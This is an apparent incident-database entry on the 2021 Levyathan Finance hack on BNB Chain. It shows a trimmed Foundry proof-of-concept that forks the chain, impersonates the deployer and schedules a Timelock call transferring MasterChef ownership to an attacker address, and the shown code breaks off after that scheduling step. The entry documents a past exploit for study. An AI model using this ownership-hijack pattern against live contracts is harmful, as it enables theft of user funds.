# [?] Levyathan Finance - (I) Lost keys and minting (II) Vulnerable emergencyWithdraw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Levyathan
Published: 2021-07-28
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-07/Levyathan_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    ILEV LEV = ILEV(0x304c62b5B030176F8d328d3A01FEaB632FC929BA);

    IMasterChef MasterChef = IMasterChef(0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4);

    ITimelock Timelock = ITimelock(0x16149999C85c3E3f7d1B9402a4c64d125877d89D);
    address attacker = 0x7507f84610f6D656a70eb8CDEC044674799265D3;
    address Deployer = 0x6DeBA0F8aB4891632fB8d381B27eceC7f7743A14;

    address user1 = 0x160B6772c9976d21ddFB3e3211989Fa099451af7;
    address user2 = 0x2db0500e1942626944efB106D6A66755802Cef20;

    function setUp() public {
        vm.createSelectFork("bsc", 9_545_966); //fork bsc at block 9545967

        vm.label(address(MasterChef), "MasterChef");
        vm.label(address(LEV), "LEV");
        vm.label(address(Timelock), "Timelock");
        vm.label(address(Deployer), "Deployer");
    }

    function test_Timelock() public {
        bytes memory Ownership_hijack =
            (abi.encodePacked(bytes4(keccak256(bytes("transferOwnership(address)"))), abi.encode(address(attacker))));

        //Schedule a transaction from the Deployer current owner of timelock.
        vm.startPrank(address(Deployer));

        Timelock.schedule(
            address(MasterChef),
            0,
            Ownership_hijack,
            bytes32(0),
            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764),
            172_800
        );

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-07/Levyathan_exp.sol_
